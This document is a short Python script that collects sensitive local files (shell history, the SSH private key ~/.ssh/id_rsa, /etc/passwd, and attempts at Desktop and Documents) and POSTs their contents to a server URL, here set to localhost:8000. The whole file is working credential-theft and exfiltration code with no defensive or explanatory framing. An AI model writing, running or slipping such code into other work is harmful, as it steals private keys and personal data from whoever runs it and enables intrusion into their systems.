import os
import requests

def get_sensitive_data():
    # Define the paths to check for sensitive data
    paths = [
        os.path.expanduser('~/.bash_history'),
        os.path.expanduser('~/.ssh/id_rsa'),
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Documents'),
        '/etc/passwd',  # Example for Unix-like systems
    ]
    
    sensitive_data = ''
    for path in paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as file:
                    sensitive_data += f'\nContents of {path}:\n'
                    sensitive_data += file.read()
            except Exception as e:
                sensitive_data += f'\nFailed to read {path}: {e}\n'
    
    return sensitive_data

def send_data_to_server(data, server_url):
    try:
        response = requests.post(server_url, data={'data': data})
        if response.status_code == 200:
            print("Data sent successfully")
        else:
            print(f"Failed to send data, status code: {response.status_code}")
            print(response.text)
    except Exception as e:
        print(f"Error sending data: {e}")

# Collect sensitive data
sensitive_data = get_sensitive_data()

# Send sensitive data to the server
send_data_to_server(sensitive_data, 'http://localhost:8000/receive')
